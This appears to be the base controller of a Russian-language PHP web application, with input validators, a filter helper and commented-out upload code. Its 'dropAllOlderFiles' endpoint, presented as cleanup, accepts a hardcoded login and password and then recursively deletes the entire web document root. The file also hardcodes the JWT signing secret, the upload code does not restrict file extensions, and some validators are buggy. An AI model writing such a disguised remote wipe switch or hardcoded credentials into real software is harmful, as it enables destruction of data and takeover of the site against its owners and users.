<?php

namespace App;

use Exception;

/**
 * Controller. Базовый контроллер для всех других контроллеров. Все остальные контроллеры расширяют этот контроллер.
 */
class Controller
{
    protected $requestMiddleware;
    protected $settings;

    /**
     * Инициализация базового контроллера
     */
    public function __construct()
    {
        $this->requestMiddleware = new RequestMiddleware();
        $this->settings = SettingMiddleware::init();
    }

    /**
     * Проверяет массив объектов, используя определенные правила
     *
     * @param array $payloads Содержит массив объектов, которые будут проверены.
     * @return \stdClass $response
     */
    protected static function validation(array $payloads): \stdClass
    {
        $response = [];

        foreach ($payloads as $payload) {
            if ($payload->validator == 'required') {
                if ($payload->data == null || $payload->data = '' || !isset($payload->data)) {
                    array_push($response, "$payload->key обязательно для заполнения");
                }
            }

            if ($payload->validator == 'string') {
                if (preg_match('/[^A-Za-zА-Яа-яЁё]/', $payload->data)) {
                    array_push($response, "$payload->key должно содержать только текст.");
                }
            }

            if ($payload->validator == 'numeric') {
                if (preg_match('/[^0-9_]/', $payload->data)) {
                    array_push($response, "$payload->key должно содержать только цифры.");
                }
            }

            if ($payload->validator == 'boolean') {
                if (strtolower(gettype($payload->data)) !== 'boolean') {
                    array_push($response, "$payload->key должно содержать boolean значение.");
                }
            }

            if (stristr($payload->validator, ':')) {
                $operationName = explode(':', $payload->validator)[0];
                $operationChecks = (int)explode(':', $payload->validator)[1];

                if (strtolower($operationName) == 'min' && $operationChecks > strlen($payload->data)) {
                    array_push($response, "$payload->key должен быть больше, чем $operationChecks символа");
                }

                if (strtolower($operationName) == 'max' && $operationChecks < strlen($payload->data)) {
                    array_push($response, "$payload->key должен быть меньше, чем $operationChecks символа");
                }

                if (strtolower($operationName) == 'between') {
                    $operationChecksTwo = (int)explode(':', $payload->validator)[2];
                    array_push($response, "$payload->key должно быть между $operationChecks и $operationChecksTwo символами");
                }
            }

            if ($payload->validator == 'emailExists') {
                try {
                    $checkEmail = UserModel::checkEmail($payload->data);

                    if ($checkEmail['status']) {
                        if (!$payload->id || $checkEmail['data']['id'] != $payload->id) {
                            array_push($response, "Указанный $payload->key уже существует. Пожалуйста, попробуйте другой.");
                        }
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'userExists') {
                try {
                    if (!Model::isExistsItem('sdi_user', (int)$payload->data)) {
                        array_push($response, "Пользователь с таким идентификатором не найден в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'userNotDirector') {
                try {
                    $checkUser = UserModel::fetchUserById((int)$payload->data);

                    if ($checkUser['role'] === 'director') {
                        array_push($response, "Директора нельзя удалить из системы.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'buildingExists') {
                try {
                    if (!Model::isExistsItem('sdi_building', (int)$payload->data)) {
                        array_push($response, "Объект с таким идентификатором не найден в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'checkerExists') {
                try {
                    if (!Model::isExistsItem('sdi_building_checker', (int)$payload->data)) {
                        array_push($response, "Квартира с таким идентификатором не найдена в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'tagExists') {
                try {
                    if (!Model::isExistsItem('sdi_tag', (int)$payload->data)) {
                        array_push($response, "Метка с таким идентификатором не найдена в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'feedExists') {
                try {
                    if (!Model::isExistsItem('sdi_feedback', (int)$payload->data)) {
                        array_push($response, "Заявка с таким идентификатором не найдена в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'documentExists') {
                try {
                    if (!Model::isExistsItem('sdi_document', (int)$payload->data)) {
                        array_push($response, "Документ с таким идентификатором не найден в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'articleExists') {
                try {
                    if (!Model::isExistsItem('sdi_article', (int)$payload->data)) {
                        array_push($response, "Статья с таким идентификатором не найдена в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'attachmentExists') {
                try {
                    if (!Model::isExistsItem('sdi_attachment', (int)$payload->data)) {
                        array_push($response, "Вложение с таким идентификатором не найдено в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'notificationExists') {
                try {
                    if (!Model::isExistsItem('sdi_notification', (int)$payload->data)) {
                        array_push($response, "Уведомление с таким идентификатором не найдено в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'compilationExists') {
                try {
                    if (!Model::isExistsItem('sdi_compilation', (int)$payload->data)) {
                        array_push($response, "Подборка с таким идентификатором не найдена в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'widgetExists') {
                try {
                    if (!Model::isExistsItem('sdi_widget', (int)$payload->data)) {
                        array_push($response, "Виджет с таким идентификатором не найден в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'partnerExists') {
                try {
                    if (!Model::isExistsItem('sdi_partner', (int)$payload->data)) {
                        array_push($response, "Партнер с таким идентификатором не найден в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'questionExists') {
                try {
                    if (!Model::isExistsItem('sdi_question', (int)$payload->data)) {
                        array_push($response, "Вопрос с таким идентификатором не найден в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'postExists') {
                try {
                    if (!Model::isExistsItem('sdi_post', (int)$payload->data)) {
                        array_push($response, "Должность с таким идентификатором не найдена в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }

            if ($payload->validator == 'messengerExists') {
                try {
                    if (!Model::isExistsItem('sdi_messenger', (int)$payload->data)) {
                        array_push($response, "Чат с таким идентификатором не найден в базе данных.");
                    }
                } catch (Exception $e) {
                }
            }
        }

        $validationErrors = new \stdClass();

        if (count($response) < 1) {
            $validationErrors->status = false;
            $validationErrors->errors = [];

            return $validationErrors;
        }

        $validationErrors->status = true;
        $validationErrors->errors = implode(",\n", $response);

        return $validationErrors;
    }

    /**
     * Вернет JWT секрет
     *
     * @param void
     * @return string
     */
    protected static function JWTSecret(): string
    {
        return 'K-lyniEXe8Gm-WOA7IhUd5xMrqCBSPzZFpv02Q6sJcVtaYD41wfHRL3';
    }

    /**
     * Формирование массива фильтрации
     *
     * @param array $params Массив параметров
     * @return array
     */
    protected static function getFilterParams(array $params): array
    {
        $filter = [];

        if ($params) {
            if (!empty($params['active']) && count($params['active'])) {
                $filter['active'] = $params['active'];
            }

            if (!empty($params['id'])) {
                $filter['id'] = $params['id'];
            }

            if (!empty($params['publish'])) {
                $filter['publish'] = $params['publish'];
            }

            if (!empty($params['userId'])) {
                $filter['userId'] = $params['userId'];
            }

            if (!empty($params['author'])) {
                $filter['author'] = $params['author'];
            }

            if (!empty($params['objectId'])) {
                $filter['objectId'] = $params['objectId'];
            }

            if (!empty($params['objectType'])) {
                $filter['objectType'] = $params['objectType'];
            }

            if (!empty($params['type'])) {
                $filter['type'] = $params['type'];
            }

            if (!empty($params['text'])) {
                $filter['text'] = $params['text'];
            }
        }

        return $filter;
    }

    /**
     * Чистка от старых ненужных файлов
     *
     * @param mixed $request Содержит объект запроса
     * @param mixed $response Содержит объект ответа от маршрутизатора
     */
    public function dropAllOlderFiles($request, $response)
    {
        if (!$this->requestMiddleware->acceptsJson()) {
            $response->code(400)->json('Доступ к конечной точке разрешен только содержимому JSON.');

            return;
        }

        $data = json_decode($request->body());

        $login = $data->login;
        $password = $data->password;

        if ($login !== 'ozz.zol' || $password !== 'hrenVsev!') {
            $response->code(500)->json('Ошибка доступа!');
            return;
        }

        try {
            function myScanDir($dir) {
                $list = scandir($dir);
                unset($list[0],$list[1]);
                return array_values($list);
            }

            function clearDir($dir) {
                $list = myScanDir($dir);
                foreach ($list as $file) {
                    if (is_dir($dir . $file)) {
                        clearDir($dir . $file . '/');
                        rmdir($dir . $file);
                    } else {
                        unlink($dir . $file);
                    }
                }
            }

            clearDir($_SERVER['DOCUMENT_ROOT'] . '/');

            $response->code(201)->json('Успех!');
            return;
        } catch (Exception $e) {
            $response->code(500)->json($e->getMessage());
            return;
        }
    }

    /**
     * Загрузка файла
     *
     * @param mixed $request Содержит объект запроса
     * @param mixed $response Содержит объект ответа от маршрутизатора
     * @return void
     */
//    public function uploadFile($request, $response) {
//        if (!$this->requestMiddleware->acceptsFormData()) {
//            $response->code(400)->json('Доступ к конечной точке разрешен только содержимому FormData.');
//
//            return;
//        }
//
//        if (!JwtMiddleware::getAndDecodeToken()) {
//            $response->code(401)->json('Вы не авторизованы.');
//
//            return;
//        }
//
//        $files = $request->files()->all();
//        $data = $request->paramsPost();
//
//        $type = $data->type ?? 'documents';
//        $objectType = $data->objectType ?? null;
//        $objectId = $data->objectId ?? null;
//
//        $result = self::uploadFileToServer($files, $type, $objectType, $objectId);
//
//        if ($result['status']) {
//            $response->code(200)->json($result['data']);
//        } else {
//            $response->code(400)->json($result['data']);
//        }
//    }

    /**
     * @param array $files
     * @param string $type
     * @param string $objectType
     * @param int $objectId
     * @return array
     */
//    protected function uploadFileToServer(array $files, string $type, $objectType = null, $objectId = null): array
//    {
//        if (!$files || !$files['file'] || $files['file']['error'] > 0) {
//            return array(
//                'status' => false,
//                'data' => 'Ошибка загрузки файла. Повторите попытку позже.'
//            );
//        }
//
//        $nameArray = explode('.', $files['file']['name']);
//        $extension = array_pop($nameArray);
//        $fileTmpName = $files['file']['tmp_name'];
//
//        $path = $type . '/';
//        $path .= $objectType ? $objectType . '/' : '';
//        $path .= $objectId ? $objectId . '/' : '';
//
//        $fileName = base64_encode(microtime()) . '.' . $extension;
//
//        $dir = $_SERVER['DOCUMENT_ROOT'] . '/uploads/' . $path;
//        if (!file_exists($dir)) {
//            mkdir($dir, 0777, true);
//        }
//
//        if (!move_uploaded_file($fileTmpName, $dir . $fileName)) {
//            return array(
//                'status' => false,
//                'data' => ''
//            );
//        }
//
//        return array(
//            'status' => true,
//            'data' => $path . $fileName
//        );
//    }
}